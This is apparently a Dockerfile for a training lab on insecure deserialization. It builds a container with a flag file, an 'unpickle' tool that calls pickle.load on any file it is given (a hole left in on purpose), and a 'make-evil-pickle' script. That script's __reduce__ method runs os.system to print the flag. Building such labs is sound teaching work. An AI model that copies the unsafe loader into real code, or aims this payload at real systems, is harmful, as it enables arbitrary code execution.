# Tier-3 Insecure-Deserialization target (~50 MB). `unpickle` loads a pickle with
# pickle.load — an untrusted pickle's __reduce__ runs arbitrary code on load.
FROM python:3.12-alpine
RUN adduser -D -H labuser \
 && mkdir -p /challenge \
 && printf 'flag{insecure_deserialization_pickle_rce}\n' > /challenge/flag.txt \
 && printf '#!/usr/bin/env python3\nimport pickle, sys\npickle.load(open(sys.argv[1], "rb"))\n' > /usr/local/bin/unpickle \
 && printf '#!/usr/bin/env python3\nimport pickle, os\nclass E:\n    def __reduce__(self):\n        return (os.system, ("cat /challenge/flag.txt",))\nopen("/tmp/evil.pkl", "wb").write(pickle.dumps(E()))\nprint("wrote /tmp/evil.pkl (its __reduce__ runs: cat /challenge/flag.txt)")\n' > /usr/local/bin/make-evil-pickle \
 && chmod 0755 /usr/local/bin/unpickle /usr/local/bin/make-evil-pickle /challenge/flag.txt \
 && printf 'NIELIT insecure-deserialization target.\nunpickle loads a pickle file with pickle.load() (unsafe).\n\nTry:\n  make-evil-pickle        # crafts /tmp/evil.pkl whose __reduce__ runs a command\n  unpickle /tmp/evil.pkl  # LOADING it executes that command -> flag\n' > /challenge/README
USER labuser
CMD ["sleep", "infinity"]
